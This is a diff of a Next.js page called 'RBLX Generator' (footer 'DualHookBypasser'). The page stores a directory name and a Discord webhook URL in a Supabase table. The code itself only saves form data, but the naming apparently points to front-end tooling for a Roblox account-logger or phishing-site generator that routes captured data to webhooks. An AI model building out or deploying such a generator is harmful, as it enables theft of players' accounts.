@@ -1,6 +1,7 @@
-"use client";
-import { useState } from "react";
-import { createClient } from "@supabase/supabase-js";
+'use client';
+
+import { useState } from 'react';
+import { createClient } from '@supabase/supabase-js';
 
 const supabase = createClient(
   process.env.NEXT_PUBLIC_SUPABASE_URL,
@@ -8,83 +9,87 @@ const supabase = createClient(
 );
 
 export default function Home() {
-  const [name, setName] = useState("");
-  const [webhook, setWebhook] = useState("");
+  const [directory, setDirectory] = useState('');
+  const [webhook, setWebhook] = useState('');
+  const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false);
-  const [message, setMessage] = useState("");
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    setLoading(true);
-    setMessage("");
-
-    if (!name || !webhook) {
-      setMessage("⚠ Please fill out both fields!");
-      setLoading(false);
+    if (!directory || !webhook) {
+      setMessage('⚠️ Please fill in all fields.');
       return;
     }
 
-    const { error } = await supabase.from("websites").insert([
-      { name: name, webhook: webhook, url: webhook },
+    setLoading(true);
+    setMessage('⏳ Generating... Please wait.');
+
+    const { data, error } = await supabase.from('websites').insert([
+      {
+        directory,
+        webhook,
+      },
     ]);
 
     if (error) {
       console.error(error);
-      setMessage("❌ Failed to save: " + error.message);
+      setMessage(`❌ Error: ${error.message}`);
     } else {
-      setMessage("✅ Saved successfully to Supabase!");
-      setName("");
-      setWebhook("");
+      setMessage('✅ Created successfully! Your entry was saved.');
+      setDirectory('');
+      setWebhook('');
     }
 
     setLoading(false);
   };
 
   return (
-    <main className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white p-6">
-      <div className="max-w-md w-full bg-gray-900/70 backdrop-blur-xl rounded-2xl p-6 shadow-lg border border-gray-700">
-        <h1 className="text-3xl font-bold mb-6 text-center">
-          ⚙️ RBLX Generator
+    <main className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex flex-col items-center justify-center p-6 text-white">
+      <div className="w-full max-w-md bg-gray-800/70 backdrop-blur-md p-8 rounded-2xl shadow-lg border border-gray-700">
+        <h1 className="text-3xl font-bold mb-6 text-center text-blue-400">
+          🔮 RBLX Generator
         </h1>
 
         <form onSubmit={handleSubmit} className="space-y-4">
           <div>
-            <label className="block text-sm mb-2 font-medium">Logs Name</label>
+            <label className="block mb-2 text-gray-300 font-medium">Directory Name</label>
             <input
               type="text"
-              value={name}
-              onChange={(e) => setName(e.target.value)}
-              className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-              placeholder="logs"
+              value={directory}
+              onChange={(e) => setDirectory(e.target.value)}
+              placeholder="Enter directory name"
+              className="w-full px-4 py-2 rounded-lg bg-gray-900 border border-gray-700 focus:ring-2 focus:ring-blue-500 outline-none text-gray-100"
             />
           </div>
 
           <div>
-            <label className="block text-sm mb-2 font-medium">
-              Discord Webhook URL
-            </label>
+            <label className="block mb-2 text-gray-300 font-medium">Discord Webhook</label>
             <input
               type="url"
               value={webhook}
               onChange={(e) => setWebhook(e.target.value)}
-              className="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
               placeholder="https://discord.com/api/webhooks/..."
+              className="w-full px-4 py-2 rounded-lg bg-gray-900 border border-gray-700 focus:ring-2 focus:ring-blue-500 outline-none text-gray-100"
             />
           </div>
 
           <button
             type="submit"
             disabled={loading}
-            className="w-full py-2 mt-4 bg-indigo-600 hover:bg-indigo-700 rounded-lg font-semibold transition"
+            className="w-full py-2.5 rounded-lg bg-blue-600 hover:bg-blue-700 transition disabled:opacity-50 font-semibold"
           >
-            {loading ? "Saving..." : "🚀 Generate"}
+            {loading ? 'Processing...' : 'Generate'}
           </button>
         </form>
 
         {message && (
-          <p className="mt-4 text-center text-sm text-gray-300">{message}</p>
+          <div className="mt-4 text-center text-sm bg-gray-900/60 p-3 rounded-lg border border-gray-700">
+            {message}
+          </div>
         )}
       </div>
+
+      <p className="mt-8 text-sm text-gray-500">© 2025 DualHookBypasser</p>
     </main>
   );
-}
+                }
